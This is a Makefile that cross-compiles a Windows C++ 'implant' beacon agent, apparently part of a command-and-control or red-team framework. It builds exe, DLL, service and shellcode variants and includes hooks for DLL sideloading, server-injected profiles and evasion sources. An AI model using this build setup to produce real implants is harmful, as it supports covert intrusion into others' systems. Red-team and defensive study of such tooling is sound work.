# __NAME__ Agent — C++ Implant Build (MinGW-w64)
#
# Usage:
#   make all         Build all architectures (default format: exe)
#   make FORMAT=dll  Build as DLL
#   make FORMAT=svc  Build as Windows service
#

SRC_DIR  := $(CURDIR)
BEACON   := __NAME__

# MinGW cross-compilers
CXX_X64  := x86_64-w64-mingw32-g++
CXX_X86  := i686-w64-mingw32-g++
HAS_X64  := $(strip $(shell where $(CXX_X64) 2>nul))
HAS_X86  := $(strip $(shell where $(CXX_X86) 2>nul))
ALL_TARGETS :=

ifneq ($(HAS_X64),)
ALL_TARGETS += x64
endif

ifneq ($(HAS_X86),)
ALL_TARGETS += x86
endif

ifeq ($(OS),Windows_NT)
CLEAN_CMD := powershell -NoProfile -Command "Remove-Item -Force '$(BEACON)_x64*','$(BEACON)_x86*','$(BEACON)_svc*' -ErrorAction SilentlyContinue"
else
CLEAN_CMD := rm -f $(BEACON)_x64* $(BEACON)_x86* $(BEACON)_svc*
endif

# Format selection: exe | dll | svc | shellcode
FORMAT   ?= exe

# Common flags (modeled on beacon_agent)
CXXFLAGS := -std=c++17 -Os -fno-stack-protector -fno-strict-overflow \
            -fno-delete-null-pointer-checks -fno-strict-aliasing \
            -fno-builtin -fno-exceptions -fno-unwind-tables \
            -fno-asynchronous-unwind-tables -fpermissive -w \
            -masm=intel -fPIC -I $(SRC_DIR) -I $(SRC_DIR)/impl -I $(SRC_DIR)/protocol -I $(SRC_DIR)/crypto

LDFLAGS  := -s -Wl,-s,--gc-sections -static-libgcc -mwindows
DEFINES  :=

# Sideloading: path to .def file for export forwarding (set by plugin)
DEFFILE  ?=

# Extra defines injected by server-side plugin (e.g. -DDEBUG -DIAT_DISABLED)
EXTRA_DEFINES ?=

# Profile header (injected by server-side plugin at build time)
PROFILE_HEADER ?=
ifneq ($(PROFILE_HEADER),)
    CXXFLAGS += -include $(PROFILE_HEADER)
endif

ifeq ($(FORMAT),dll)
    DEFINES += -DBUILD_DLL -D_WIN32_WINNT=0x0600
    LDFLAGS += -shared
    ifneq ($(DEFFILE),)
        LDFLAGS += $(DEFFILE)
    endif
    EXT_X64  = _x64.dll
    EXT_X86  = _x86.dll
else ifeq ($(FORMAT),svc)
    DEFINES += -DBUILD_SVC
    EXT_X64  = _svc_x64.exe
    EXT_X86  = _svc_x86.exe
else ifeq ($(FORMAT),shellcode)
    DEFINES += -DBUILD_SHELLCODE
    EXT_X64  = _x64.bin
    EXT_X86  = _x86.bin
else
    EXT_X64  = _x64.exe
    EXT_X86  = _x86.exe
endif

# Source files
SOURCES := $(wildcard impl/*.cpp) crypto/crypto.cpp protocol/protocol.cpp config.cpp main.cpp
# __EVASION_SOURCES__

.PHONY: all x64 x86 clean

all: $(ALL_TARGETS)

x64:
	@echo "[*] Building $(BEACON) x64 ($(FORMAT))..."
	$(CXX_X64) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X64) $(SOURCES) -lws2_32 -lwinhttp
	@echo "[+] $(BEACON)$(EXT_X64)"

x86:
	@echo "[*] Building $(BEACON) x86 ($(FORMAT))..."
	$(CXX_X86) $(CXXFLAGS) $(DEFINES) $(EXTRA_DEFINES) $(LDFLAGS) -o $(BEACON)$(EXT_X86) $(SOURCES) -lws2_32 -lwinhttp
	@echo "[+] $(BEACON)$(EXT_X86)"

clean: ; @$(CLEAN_CMD)
